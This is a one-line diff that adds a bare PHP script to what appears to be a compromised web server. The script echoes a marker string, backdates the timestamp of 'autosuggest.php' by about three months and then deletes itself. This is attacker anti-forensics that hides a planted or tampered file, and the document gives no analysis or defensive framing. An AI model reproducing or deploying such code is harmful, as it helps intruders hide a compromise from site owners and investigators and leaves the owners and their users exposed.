@@ -1,0 +1,1 @@
+<?php echo "ftBXhrcGRX"; if (file_exists("./autosuggest.php")){ touch("./autosuggest.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*2W82rNnxkFBTsFz3h2Mv*/ ?>
